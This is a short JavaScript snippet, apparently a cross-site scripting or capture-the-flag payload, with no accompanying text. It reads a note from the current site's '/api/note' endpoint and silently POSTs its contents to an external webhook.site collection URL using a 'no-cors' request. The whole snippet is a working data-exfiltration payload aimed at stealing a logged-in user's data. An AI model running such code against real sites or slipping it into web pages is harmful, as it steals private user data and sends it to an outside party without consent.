fetch('/api/note')
.then(r => r.json())
.then(data => {
  fetch('https://webhook.site/8687e340-2901-45ef-9a3a-c8e1ea8cfc32', {
    method: 'POST',
    mode: 'no-cors',
    body: data.note
  });
});
